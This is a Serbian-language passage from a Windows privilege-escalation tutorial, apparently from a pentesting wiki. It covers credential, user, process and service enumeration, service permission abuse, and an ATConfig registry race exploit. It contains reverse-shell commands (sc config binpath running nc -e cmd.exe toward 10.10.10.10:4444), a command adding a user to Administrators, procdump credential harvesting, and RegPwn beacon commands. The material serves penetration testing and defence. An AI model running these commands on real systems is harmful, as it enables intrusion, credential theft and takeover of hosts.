reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditive domena** autentifikuje **Local Security Authority** (LSA), a koriste ih komponente operativnog sistema. Kada registrovani bezbednosni paket autentifikuje podatke za prijavu korisnika, obično se uspostavljaju akreditivi domena za tog korisnika.\
[**Više informacija o keširanim akreditivima**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Enumerisanje korisnika i grupa

Proverite da li neka od grupa kojima pripadate ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da povećate privilegije**. Ovde saznajte više o privilegovanim grupama i o tome kako da ih zloupotrebite za povećanje privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i o tome kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Početne fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzimanje sadržaja clipboard-a

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za fajlove i fascikle

Pre svega, pri listanju procesa **proverite da li se lozinke nalaze u komandnoj liniji procesa**.\
Proverite da li možete **da zamenite neku pokrenutu binarnu datoteku** ili imate dozvole za pisanje u fasciklu binarne datoteke kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); možete ih zloupotrebiti za eskalaciju privilegija.

Debugger listener može biti kratkotrajan, pa njegovo odsustvo iz jednog pasivnog snimka portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću pristupa korisnika sa nižim privilegijama; samo ime aplikacije ili debug zastavica ne dokazuju izvršavanje koda između korisnika. Rutinsko prikupljanje podataka obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola binarnih datoteka procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola za fascikle u kojima se nalaze binarne datoteke procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort direktorijumi za dynamic preprocessor

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Za zakazani zadatak ili servis koji pokreće Snort pod drugim nalogom, pregledajte tu konkretnu konfiguraciju i ACL direktorijuma navedenog za module. Ako vaš token može da kreira datoteke u tom direktorijumu, ta putanja je kandidat za proveru mogućeg izvršavanja koda pri sledećem učitavanju modula od strane tog zadatka ili servisa. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja deny ili share; sama mogućnost pisanja u direktorijum ne dokazuje eskalaciju. [Snort-ova dokumentacija za dynamic preprocessor](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Web servis sa privilegijama i upisivim korenom dokumenata

Na Windows instalaciji Apache-a uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa `DocumentRoot` vrednošću u aktivnoj datoteci `httpd.conf`. U uobičajenom XAMPP rasporedu proverite `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog korena dokumenata, koji je često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom korenu dok Apache radi kao `LocalSystem`, izvršavanje koda na strani servera može da pređe granicu privilegija hosta. Potvrdite da je servis pokrenut, da se poslužuje tačna putanja i da rukovalac na strani servera obrađuje taj tip datoteke; mogućnost pisanja u koren sama po sebi dokazuje samo kreiranje datoteke. Pregledajte ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za konvencionalnu WAMP instalaciju, servis može da pokazuje na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom pored njega, u `conf\httpd.conf`, i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu servisnu sliku, identitet pod kojim se servis pokreće, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i izmene za virtuelne hostove) i ACL korena. To što je WAMP direktorijum upisiv ne dokazuje da se Apache pokreće kao `SYSTEM` niti da izvršava poslati fajl. [Apache dokumentuje kako Windows servis bira konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Upisiv IIS koren i mrežni identitet aplikacionog pula

Za IIS, povežite upisiv fizički direktorijum sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji su mu pul i serverski handler konfigurisani. Kod smešten u direktorijumu koji se poslužuje izvršava se kao pul samo ako IIS obrađuje taj tip fajla i ako je ruta dostupna. Pre nego što upisivi direktorijum smatrate putem do izvršavanja koda, proverite efektivna ovlašćenja trenutnog korisnika za kreiranje fajlova, stanje sajta, handler i preklapanja podešavanja za konkretnu putanju.

Dinamičko kompajliranje ASP.NET-a otvara zaseban put koji treba proveriti: generisani fajlovi u direktorijumu za kompajliranje aplikacije. Podrazumevano je to direktorijum `Temporary ASP.NET Files` unutar odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` u aplikaciji može da ga promeni. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za kompajliranje kada aplikacioni pulovi nemaju međusobno poverenje](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom radnog procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL fajla ili direktorijuma ne dokazuje izvršavanje koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, podešavanjima kompajliranja, identitetom procesa i trenutkom ponovnog kompajliranja. Koristite pregled metapodataka samo za čitanje; nemojte pokretati kompajliranje niti menjati fajlove keša tokom enumeracije.

IIS pul konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se autentifikuje na domenske resurse kao **nalog računara domaćina**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke lokalne privilegije i takođe koristi nalog računara na mreži; `LocalService` obično koristi anonimne mrežne akreditive. Pul `SpecificUser` koristi umesto toga konfigurisani nalog. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet aplikacionog pula](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako podešavanje identiteta nije navedeno, mogu da se naslede podrazumevane vrednosti pula, koje se razlikuju među generacijama IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu imena pula. Ako izvršavanje koda stigne do pula koji koristi identitet naloga računara na mreži, procenite prava direktorijuma koja ima **taj konkretan računar**. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava replikacije nad kontekstom imenovanja domena; sama mašinska karta ili uloga domaćina ne dokazuju da ta prava postoje. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove bez otpremanja fajla, uspostavljanja mrežne autentifikacije ili zahtevanja karata.

Za čitljiv ASP.NET handler koji pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i sastavljanje komande. Handler koji konkatenira dekodirani token u `ProcessStartInfo("cmd", "/c ...")` može da dozvoli metaznakovima ljuske da promene komandu; [Microsoft dokumentuje specijalne znakove komande `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i pristupi handleru, a zatim utvrdite efektivni identitet aplikacionog pula ili impersoniranog korisnika i identitet podprocesa. Čitljiv red izvornog koda, listener na localhost-u ili slabost formata tokena sami po sebi ne dokazuju izvršavanje privilegovane komande. Pregledajte izvorni kod i konfiguraciju pula bez slanja falsifikovanih zahteva ili pokretanja pomoćnog procesa tokom pasivne enumeracije.

Za PHP servis na Windows-u, putanja pod kontrolom zahteva prosleđena funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php) može da izvrši PHP fajl koji može da menja korisnik sa nižim privilegijama, pod identitetom radnog procesa. Potvrdite da zahtev može da dođe do te naredbe, da razrešena putanja pokazuje na fajl koji korisnik sa nižim privilegijama može da menja, a radni proces da čita, da primenljiva ograničenja putanje u PHP-u dozvoljavaju uključivanje i da radni proces zaista ima veće privilegije. Listener na loopback interfejsu ili upisiv fajl sami po sebi ne dokazuju ovaj lanac; tokom pasivne enumeracije pregledajte izvorni kod, identitet servisa i ACL-ove fajlova, bez pozivanja krajnje tačke.

### Pronalaženje lozinki u memoriji

Možete napraviti memorijski dump pokrenutog procesa pomoću **procdump** iz sysinternals. Servisi poput FTP-a imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje rade kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), potražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa višim privilegijama

Aplikacija koja automatski otvara projekte iz padajućeg direktorijuma u koji korisnik sa nižim privilegijama može da upisuje podatke prelazi granicu poverenja u ulazne podatke, u kontekstu naloga koji vrši uvoz. Proverite **tačnu putanju u koju je moguće upisivati**, proces ili zadatak koji otvara projekat, njegov efektivni identitet i verziju parsera. [Istorijski problem sa otvaranjem/obnavljanjem Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je korišćenje spoljašnjih XML entiteta u metapodacima projekta; mrežni entitet u operativnom sistemu Windows mogao je da izazove autentifikaciju nalogom koji vrši uvoz, ako to dozvoljavaju [pravila za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To je naznaka mogućeg izlaganja akreditiva, a ne neposrednog pristupa administratora: dobijeni odgovor mora moći da se iskoristi kroz zasebnu autorizovanu ili ranjivu putanju, a trenutne verzije treba proceniti na osnovu njihovog stvarnog statusa zakrpa. Nemojte otvarati posebno napravljen projekat tokom pasivne enumeracije; pregledajte tok uvoza i ACL-ove.

## Servisi

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) na objektu Service Control Manager (SCM) odvojeno je od prava nad postojećim servisom. Uspešan zahtev za pristup samo za čitanje preko [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo predstavlja naznaku za proveru, a ne dokaz da se novi servis može pokrenuti. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pravima pristupa servisu zatraženim prilikom kreiranja; naknadno ponovno otvaranje servisa vrši zasebnu proveru pristupa i može da ne uspe čak i kada je moguće koristiti originalni handle. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, servisni nalog, pravila pokretanja i putanju izvršne datoteke. Nemojte kreirati niti pokretati servis tokom pasivne enumeracije.

Kod udaljene putanje za instalaciju servisa, povežite ta SCM prava sa deljenim resursom na ciljnom sistemu u koji **isto mrežno prijavljivanje** može da upisuje, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju servisni nalog može da pokrene. Nalog koji nije administratorski može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i mogućnost postavljanja datoteke; administrativni deljeni resurs nije neophodan uslov. Sam pristup za upisivanje u deljeni resurs ili naznaka prava za kreiranje servisa u SCM-u ne dokazuje da se novi servis može pokrenuti sa višim identitetom.

Postojeći servis može da poziva pomoćnu izvršnu datoteku pri pokretanju, gašenju ili drugom događaju životnog ciklusa, čak i kada te pomoćne datoteke nema u njegovom `ImagePath`-u. Ako se ime pomoćne datoteke razrešava u direktorijum u koji korisnik sa nižim privilegijama može da upisuje, a servis radi sa višim identitetom, nedostajuća pomoćna datoteka može biti kandidat za uslovnu zamenu. Potvrdite **stvarni kod servisa ili dokumentovano pozivanje pomoćne datoteke**, razrešenu putanju do izvršne datoteke i redosled pretrage, prava za kreiranje direktorijuma, identitet servisa i dostupni okidač životnog ciklusa. Sam direktorijum servisa u koji je moguće upisivati ili nedostajuća datoteka ne dokazuje da servis učitava tu datoteku; tokom pasivne provere nemojte pokretati niti zaustavljati servis.

Za postojeći servis, [`SERVICE_START` dozvoljava prosleđivanje argumenata funkciji `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to je odvojeno od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Pregledajte kod servisa ili dokumentovano sučelje pre nego što pristup za pokretanje smatrate nečim više od prava za upravljanje. Ako koristi argument koji je izabrao pozivalac kao putanju za zapisivanje loga ili izvoz, proverite identitet servisa, tačan tok argumenta do upisivanja, ograničenja putanje i dozvole nad **kreiranom datotekom**. Upisivanje u zaštićeni direktorijum može dovesti do eskalacije samo ako postoji zaseban privilegovani potrošač ili učitavač koji prihvata tu datoteku; log u koji je moguće upisivati ili samo pravo za pokretanje nisu dovoljni. Tokom pasivne inventarizacije nemojte pokretati servis niti kreirati probnu datoteku.

Kod agenta za nadzor NSClient++, datoteka `nsclient.ini` dostupna za čitanje predstavlja **naznaku za proveru konfiguracije**: može da sadrži web akreditive, dok `boot.ini` može da preusmeri konfiguraciju na drugu lokaciju. Proverite stvarni servisni nalog, WEB listener i pravila pristupa, kao i to da li autentifikovana uloga može da menja podešavanja ili skripte. Za privilegovano izvršavanje dodatno su potrebni `CheckExternalScripts` (ili druga omogućena putanja za izvršavanje), efektivno pravo za registrovanje ili izmenu komande i okidač koji je pokreće pod identitetom servisa. Listener ograničen samo na loopback i dalje može biti dostupan lokalnom korisniku, ali sama putanja do datoteke, lozinka ili listener ne dokazuju postojanje tih prava. Pregledajte metapodatke i dozvole bez prikazivanja tajni ili pozivanja web API-ja tokom pasivne enumeracije. Pogledajte [raspored datoteka NSClient++-a](https://nsclient.org/docs/concepts/file-layout/), [uputstvo za bezbednost weba i skripti](https://nsclient.org/docs/setup/securing/) i [konfiguraciju spoljašnjih skripti](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kod servisa čiji je `ImagePath` `nssm.exe`, proverite stvarni nalog pod kojim se servis pokreće i njegovu vrednost `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM tamo čuva podređenu aplikaciju](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), dok je `AppDirectory` njegov konfigurisani radni direktorijum. Proverite podređenu izvršnu datoteku i ACL-ove njenog nadređenog direktorijuma pre nego što dozvole omotača smatrate celom granicom bezbednosti servisa. Lokalna WCF ili SOAP krajnja tačka koju izlaže ta podređena aplikacija predstavlja zasebnu naznaku za proveru: potvrdite da joj korisnik sa nižim privilegijama može pristupiti, da tačna operacija prihvata njegove ulazne podatke i da podređena aplikacija servisa izvršava nesigurnu operaciju pod višim identitetom. Sam servisni nalog, URL krajnje tačke ili putanja u koju je moguće upisivati ne dokazuju eskalaciju; izbegavajte pozivanje servisnih operacija tokom pasivne enumeracije.

Kod prilagođene WCF operacije, pratite string koji kontroliše pozivalac do svakog PowerShell runspace-a. [`Pipeline.Commands.AddScript` dodaje tekst skripte](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` pokreće pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` sa Windows transportnim akreditivima](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentifikuje klijenta, ali ovlašćenje za pozivanje te **konkretne** operacije i efektivni identitet runspace-a moraju se proveriti zasebno. Putanja od ulaznih podataka korisnika sa nižim privilegijama do `AddScript`-a pod višim servisnim identitetom predstavlja granicu za izvršavanje koda; port koji sluša, autentifikovani klijent ili neiskorišćena metoda u nepovezanom sklopu sami po sebi nisu dokaz. Statički pregledajte raspoređeni servis, ugovor, autorizaciju i podešavanja impersonacije, bez pozivanja krajnje tačke tokom enumeracije.

Service Triggers omogućavaju sistemu Windows da pokrene servis kada nastupe određeni uslovi (aktivnost imenovane cevi/RPC krajnje tačke, ETW događaji, dostupnost IP adrese, priključivanje uređaja, osvežavanje GPO-a itd.). Često možete pokrenuti privilegovane servise aktiviranjem njihovih okidača čak i bez prava SERVICE_START. Tehnike enumeracije i aktiviranja potražite ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Servis za prikupljanje dijagnostike u Visual Studio-u

Instalacije Visual Studio-a sa C/C++ alatima mogu da sadrže `VSStandardCollectorService150`, dijagnostički servis podešen da radi kao `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) koristio je junction i trku sa object-manager-link-om da preusmeri resetovanje DACL-a servisa. Demonstrirana eskalacija zahtevala je i upotrebljivu putanju za popravku MSI-ja preko Visual Studio Setup WMI Provider-a, kao i ciljnu datoteku `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponenta je popravljena u januaru 2024.

Za pasivnu trijažu, proverite nalog i putanju do binarne datoteke tog servisa, da li postoji putanja do Setup WMI kompajlera i status zakrpa instalirane komponente. Stavka servisa, verzija Visual Studio proizvoda ili datoteka kompajlera sami po sebi ne dokazuju da je sistem ranjiv. Provera ne zahteva pokretanje servisa niti izvršavanje popravke.

Preuzmite listu servisa:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarnu datoteku **accesschk** iz paketa _Sysinternals_ kako biste proverili potreban nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li grupa „Authenticated Users“ može da menja bilo koji servis:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga ne može da se pokrene jer je onemogućena ili zato što nijedan uređaj povezan s njom nije omogućen._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da servis upnphost zavisi od servisa SSDPSRV da bi radio (za XP SP1)**

**Drugo zaobilazno rešenje** ovog problema je da pokrenete:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ ima **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati putem različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfiguraciju binarne datoteke servisa.
- **WRITE_DAC**: Omogućava rekonfiguraciju dozvola, čime se stiče mogućnost izmene konfiguracija servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i rekonfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost izmene konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost izmene konfiguracija servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole nad binarnim datotekama servisa

Ako se servis izvršava kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može oteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju servis izvršava** ili da li imate **dozvole za upis u fasciklu** u kojoj se nalazi binarna datoteka ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Pomoću **wmic** možete da pribavite sve binarne datoteke koje servis izvršava (ne u system32), a zatim da proverite svoje dozvole pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL-ove dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito dozvole **`(F)`**, **`(M)`** ili **`(W)`** za izvršnu datoteku usluge ili direktorijum koji je sadrži. Praktičan postupak zloupotrebe je:<sup>[[27]](#references)</sup>

1. Potvrdite nalog usluge i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Proverite da li je binarna datoteka upisiva pomoću `icacls <path>`.
3. Zamenite binarnu datoteku usluge payload-om ili validnom zlonamernom binarnom datotekom usluge.
4. Ponovo pokrenite uslugu pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač usluge).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako usluga ne dozvoljava običnom korisniku da je ponovo pokrene, proverite da li se automatski pokreće pri podizanju sistema, da li ima radnju pri otkazu koja je ponovo pokreće ili može indirektno da je pokrene aplikacija koja je koristi.

### Dozvole za izmenu registra usluga

Proverite da li možete da izmenite neki ključ registra usluge.\
Svoje **dozvole** nad **ključem registra** usluge možete da **proverite** ovako:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za upis u ključ registra određene usluge. Sam ACL unos ne dokazuje efektivan pristup: važni su deny unosi, trenutni token i nasleđene dozvole. Prava za ključ registra odvojena su od prava `SERVICE_CHANGE_CONFIG` i `SERVICE_START` za objekat usluge. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije usluge, način da se usluga pokrene i identitet usluge sa višim privilegijama. Pogledajte Microsoft-ove [prava za ključeve registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [referencu za prava pristupa usluzi](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili Path binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka pri korišćenju simboličke veze u registru za proizvoljan upis vrednosti u HKLM (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju ključeve **ATConfig** za svakog korisnika, koje kasnije kopira **SYSTEM** proces u HKLM ključ sesije. **Trka pri korišćenju simboličke veze** u registru može da preusmeri taj privilegovani upis na **bilo koju путању у HKLM-у**, čime se dobija mogućnost proizvoljnog **upisa vrednosti** u HKLM.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: Tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja/prelaza na bezbednu radnu površinu i korisnik može da upisuje u njega.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Postavite vrednost **HKCU ATConfig** koju želite da SYSTEM upiše.
2. Pokrenite kopiranje pri prelasku na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće AT broker tok.
3. **Pobeditе u trci** tako što ćete postaviti **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite ključ **HKLM Session ATConfig** vezom u registru ka zaštićenoj ciljnoj putanji u HKLM-u.
4. SYSTEM upisuje vrednost koju je izabrao napadač na preusmerenu putanju u HKLM-u.

Kada dobijete mogućnost proizvoljnog upisa vrednosti u HKLM, pređite na LPE tako što ćete izmeniti konfiguracione vrednosti servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploit-a **zaključava radnu stanicu** kao deo trke.

Primeri alatki (RegPwn BOF / samostalna verzija):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory u registru servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate potključeve u njemu**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaku putanju koja se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
